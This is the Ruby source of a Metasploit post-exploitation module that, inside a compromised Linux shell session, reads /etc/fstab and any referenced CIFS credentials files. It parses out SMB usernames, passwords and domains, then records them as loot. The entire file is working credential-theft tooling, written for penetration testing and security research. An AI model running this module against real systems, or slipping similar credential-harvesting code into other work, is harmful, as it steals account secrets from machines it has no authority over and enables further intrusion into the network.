##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Post

  include Msf::Post::File

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Linux Gather Saved mount.cifs/mount.smbfs Credentials',
        'Description'   => %q{
          Post Module to obtain credentials saved for mount.cifs/mount.smbfs in
          /etc/fstab on a Linux system.
        },
        'License'       => MSF_LICENSE,
        'Author'        => [ 'Jon Hart <jhart[at]spoofed.org>'],
        'Platform'      => [ 'linux' ],
        'SessionTypes'  => [ 'shell' ]
      ))
  end

  def run
    # keep track of any of the credentials files we read so we only read them once
    cred_files = []
    # where we'll store hashes of found credentials while parsing.  reporting is done at the end.
    creds = []
    # A table to store the found credentials for loot storage afterward
    cred_table = Rex::Ui::Text::Table.new(
    'Header'    => "mount.cifs credentials",
    'Indent'    => 1,
    'Columns'   =>
    [
      "Username",
      "Password",
      "Server",
      "File"
    ])

    # parse each line from /etc/fstab
    read_file("/etc/fstab").each_line do |fstab_line|
      fstab_line.strip!
      # where we'll store the current parsed credentials, if any
      cred = {}
      # if the fstab line utilizies the credentials= option, read the credentials from that file
      if (fstab_line =~ /\/\/([^\/]+)\/\S+\s+\S+\s+cifs\s+.*/)
        host = $1
        # IPs can occur using the ip option, which is a backup/alternative
        # to letting UNC resolution do its thing
        host = $1 if (fstab_line =~ /ip=([^, ]+)/)
        if (fstab_line =~ /cred(?:entials)?=([^, ]+)/)
          file = $1
          # skip if we've already parsed this credentials file
          next if (cred_files.include?(file))
          # store it if we haven't
          cred_files << file
          # parse the credentials
          creds << parse_credentials_file(file)
        # if the credentials are directly in /etc/fstab, parse them
        elsif (fstab_line =~ /\/\/([^\/]+)\/\S+\s+\S+\s+cifs\s+.*(?:user(?:name)?|pass(?:word)?)=/)
          creds <<  parse_fstab_credentials(fstab_line)
        end
      end
    end

    # all done.  clean up, report and loot.
    creds.flatten!
    creds.compact!
    creds.uniq!
    creds.each do |cred|
      # XXX: currently, you can only report_auth_info on an IP or a valid Host.  in our case,
      # host[:host] is *not* a Host.  Fix this some day.
      if (Rex::Socket.dotted_ip?(cred[:host]))
        report_auth_info({ :port => 445, :sname => 'smb', :type => 'password', :active => true }.merge(cred))
      end
      cred_table << [ cred[:user], cred[:pass], cred[:host], cred[:file] ]
    end

    # store all found credentials
    unless (cred_table.rows.empty?)
      print_line("\n" + cred_table.to_s)
      p = store_loot(
        "mount.cifs.creds",
        "text/csv",
        session,
        cred_table.to_csv,
        "mount_cifs_credentials.txt",
        "mount.cifs credentials")
      print_status("CIFS credentials saved in: #{p.to_s}")
    end
  end

  # Parse mount.cifs credentials from +line+, assumed to be a line from /etc/fstab.
  # Returns the username+domain and password as a hash, nil if nothing is found.
  def parse_fstab_credentials(line, file="/etc/fstab")
    creds = {}
    # get the username option, which comes in one of four ways
    user_opt = $1 if (line =~ /user(?:name)?=([^, ]+)/)
    case user_opt
    # domain/user%pass
    when /^([^\/]+)\/([^%]+)%(.*)$/
      creds[:user] = "#{$1}\\#{$2}"
      creds[:pass] = $3
    # domain/user
    when /^([^\/]+)\/([^%]+)$/
      creds[:user] = "#{$1}\\#{$2}"
    # user%password
    when /^([^%]+)%(.*)$/
      creds[:user] = $1
      creds[:pass] = $2
    # user
    else
      creds[:user] = user_opt
    end if (user_opt)

    # get the password option if any
    creds[:pass] = $1 if (line =~ /pass(?:word)?=([^, ]+)/)

    # get the domain option, if any
    creds[:user] = "#{$1}\\#{creds[:user]}" if (line =~ /dom(?:ain)?=([^, ]+)/)

    creds[:file] = file unless (creds.empty?)
    (creds.empty? ? nil : creds)
  end

  # Parse mount.cifs credentials from +file+, returning the username+domain and password
  # as a hash, nil if nothing is found.
  def parse_credentials_file(file)
    creds = {}
    domain = nil
    read_file(file).each_line do |credfile_line|
      case credfile_line
      when /domain=(.*)/
        domain = $1
      when /password=(.*)/
        creds[:pass] = $1
      when /username=(.*)/
        creds[:user] = $1
      end
    end
    # prepend the domain if one was found
    creds[:user] = "#{domain}\\#{creds[:user]}" if (domain and creds[:user])
    creds[:file] = file unless (creds.empty?)

    (creds.empty? ? nil : creds)
  end
end
